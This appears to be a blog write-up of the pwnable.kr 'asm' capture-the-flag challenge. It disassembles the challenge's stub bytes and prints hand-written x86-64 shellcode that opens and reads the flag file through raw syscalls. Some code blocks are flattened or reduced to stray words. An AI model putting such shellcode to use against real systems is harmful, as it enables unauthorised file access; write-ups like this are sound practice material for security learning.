---
layout: post
title: "Pwnable.kr writeup — asm"
date: 2017-10-29 03:58:11 +0000
categories: blog
---

### Pwnable.kr writeup — asm

This is a good start to practice writing shellcode.

Reading the source code, it actually inserts a stub code before the shellcode we need to provide. It is very easy to disassemble the stub code with rasm2:

```
$ rasm2 -b64 -d -B `printf "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"`
```

so it is just clearing many registers, fortunately not including %esp. Therefore we don’t need to worry about setup stack.

```
%esp
```

Writing shellcode is pretty straight forward, only two things need to note:

```
nasm
```

So the following is the shellcode I write.

```
BITS 64GLOBAL _start_start:    jmp filenameopen:    ; fd = sys_open("...", flag, mode)    pop rdi ; filename    mov rsi, 0 ; flags = 0    mov rdx, 0 ; mode = 0    mov rax, 2 ; sys_open    syscall
```

```
test rax, rax  ; file exists?    jz error
```

```
; sys_read(fd, buffer, size)    push rax    pop rdi ; fd    mov rdx, 0x43 ;size    sub rsp, rdx    ;make room on the stack    mov rsi, rsp    ;buffer    xor rax, rax    ;sys_read    syscall
```

```
; sys_write(1, buffer, size)    mov rdx, rax    ;size    mov rsi, rsp ; buffer    mov rdi, 1 ; fd    mov rax, 1 ; sys_write    syscall
```

```
error:    ; sys_exit    xor rax, rax    inc rax    xor rdi, rdi    syscall
```

```
filename:    call open    db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
```